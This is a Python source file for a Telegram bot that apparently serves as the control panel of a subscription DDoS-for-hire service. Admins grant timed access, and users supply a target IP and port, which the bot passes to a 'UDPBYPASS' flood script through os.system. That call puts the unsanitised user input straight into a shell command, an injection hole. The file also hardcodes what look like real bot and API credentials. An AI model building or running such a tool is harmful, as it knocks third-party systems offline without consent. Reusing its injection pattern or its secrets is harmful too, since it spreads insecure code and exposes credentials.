import telebot
from datetime import datetime, timedelta
import os

API_ID = '20001924'
API_HASH = '9638c56b164f36ad63aa485fa581935e'
BOT_TOKEN = '7567538473:AAGeH_UP94HMw52sN8aNmjBsJM4m0CXPzBM'
SESSION_NAME = 'session'

TARGET_USERNAME = 'ddos_ss1_bot'
REQUIRED_CHANNELS = ['@python968', '@EagleeEyee']
ADMIN_IDS = ['7468785775', '7196955838']
bot = telebot.TeleBot(BOT_TOKEN)

user_state = {}
user_cooldowns = {}
COOLDOWN_SECONDS = 180
ACTIVE_FILE = "active.txt"

def is_subscribed(user_id):
    try:
        for channel in REQUIRED_CHANNELS:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception as e:
        print(f"Subscription check error: {e}")
        return False

def clean_expired_ids():
    if not os.path.exists(ACTIVE_FILE):
        return []

    updated = []
    now = datetime.now()

    with open(ACTIVE_FILE, "r") as f:
        for line in f:
            parts = line.strip().split("|")
            if len(parts) == 2:
                uid, expire_str = parts
                expire_time = datetime.fromisoformat(expire_str)
                if expire_time > now:
                    updated.append(f"{uid}|{expire_time.isoformat()}")

    with open(ACTIVE_FILE, "w") as f:
        for line in updated:
            f.write(line + "\n")

    return [line.split("|")[0] for line in updated]

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.reply_to(message, "Welcome! Use /attack")

@bot.message_handler(commands=['admin'])
def handle_admin(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 You are not an admin.")
        return

    parts = message.text.strip().split()
    if len(parts) != 3:
        bot.reply_to(message, "❌ Usage: /admin 1d|1w|1m <user_id>")
        return

    duration_str = parts[1].lower()
    target_id = parts[2]

    now = datetime.now()

    if duration_str.endswith("d"):
        days = int(duration_str.replace("d", ""))
        expire_time = now + timedelta(days=days)
    elif duration_str.endswith("w"):
        weeks = int(duration_str.replace("w", ""))
        expire_time = now + timedelta(weeks=weeks)
    elif duration_str.endswith("m"):
        months = int(duration_str.replace("m", ""))
        expire_time = now + timedelta(days=30 * months)
    else:
        bot.reply_to(message, "❌ Invalid duration. Use 1d, 1w, or 1m.")
        return

    with open(ACTIVE_FILE, "a") as f:
        f.write(f"{target_id}|{expire_time.isoformat()}\n")

    start = now.strftime("%-d/%-m/%Y %I:%M%p")
    end = expire_time.strftime("%-d/%-m/%Y %I:%M%p")
    bot.send_message(message.chat.id, f"✅ New subscribe at\n{start} TO {end}")

@bot.message_handler(commands=['attack'])
def handle_send(message):
    user_id = str(message.from_user.id)

    if not is_subscribed(message.from_user.id):
        bot.send_message(message.chat.id,
                         "❌ You must subscribe to both channels to use this bot:\n"
                         "👉 @python968\n"
                         "👉 @EagleeEyee")
        return

    allowed_ids = clean_expired_ids()

    now = datetime.now()
    if user_id in allowed_ids:
        last_used = user_cooldowns.get(user_id)
        if last_used and (now - last_used).total_seconds() < COOLDOWN_SECONDS:
            remaining = COOLDOWN_SECONDS - int((now - last_used).total_seconds())
            bot.send_message(message.chat.id, f"⏳ Please wait {remaining} seconds before next attack.")
            return

        bot.send_message(message.chat.id, "Send IP:")
        user_state[user_id] = {"step": "waiting_for_ip"}
    else:
        bot.send_message(message.chat.id, "You are not allowed. dm @orob4s & @k4k_fahd")

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    user_id = str(message.from_user.id)
    if user_id not in user_state:
        return

    state = user_state[user_id]

    if state["step"] == "waiting_for_ip":
        state["ip"] = message.text.strip()
        state["step"] = "waiting_for_port"
        bot.send_message(message.chat.id, "Port:")

    elif state["step"] == "waiting_for_port":
        ip = state["ip"]
        port = message.text.strip()

        try:
            os.system(f'python log.py /attack UDPBYPASS {ip} {port} 60')
            bot.send_message(message.chat.id, "Attack sent✅")
            user_cooldowns[user_id] = datetime.now()
        except Exception as e:
            bot.send_message(message.chat.id, f"Error sending: {str(e)}")

        user_state.pop(user_id)

bot.polling(none_stop=True, interval=0)
